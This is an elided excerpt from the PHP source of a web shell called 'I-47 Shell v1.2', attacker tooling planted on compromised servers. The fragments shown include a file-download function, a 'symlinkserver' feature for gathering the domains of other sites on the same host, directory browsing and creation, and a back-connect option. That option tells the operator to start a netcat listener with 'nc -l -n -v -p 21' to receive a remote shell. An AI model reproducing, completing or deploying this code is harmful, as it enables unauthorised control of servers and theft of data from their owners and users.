...
return $info;
	...
	function download()
	{
	   ...
	   header("Content-length: ".filesize($frd)); 
	   header("Content-disposition: attachment; filename=\"".basename($frd)."\";"); 
   	   readfile($frd);
...
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><font size="6" color="#FF0000" style="text-decoration:none;" face="Times New Roman, Times, serif">I-47 v1.2: By Arjun </font></a>
...
<table border="3" width="100%;" cellpadding="2">
	<tr>
		<td style="border:none;"><a href="<?php echo $self;?>"><font color="#FF0000">Home</font></a></td><font color="#1B1B1B" size="0">
...
?>"); 
	...
	{ ?>
		<bR><center>
		  <p><font color=red size=6><u>I-47 Shell v1.2</u></font><br>
...
================================
	...
	// Get Domains
	else if(isset($_GET["symlinkserver"]))
	{
		?>
...
else if(isset($_GET['connect']))
{
	...
	<div align="center"><font color="#FF0000" size="3">Click "Connect" only after open port for it. You should use NetCatÂ©, run "nc -l -n -v -p 21"!</font></div>
   ...
   if(isset($_GET['download']))
	...
	if(is_dir($dir))
    {
        ...
        foreach($dirs as $val)
		{
    	    ...
    	    <?php if($val == ".") continue; else if($val=="..") { $val = Trail($dir . $directorysperator . $val,$directorysperator); ?>
...
<input type="submit" value="Create Directory" name="createdir" class="but">
</form><?php
...
<hr>
<div align="center">
<font size="6" face="Times New Roman, Times, serif" color="#00CC00">I-47 v1.2 <br>
...
?>
	...
	<div style="background-color:#006600; width:50%; border-radius:7px; margin-top:150px; -moz-border-radius:25px; height:410px; background-image:url(Windows_7_-_Alien_from_outer_space.jpg);">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font size="7"><b>I-47 v1.2 </b></font></blink></td>
			</tr>
			<tr>
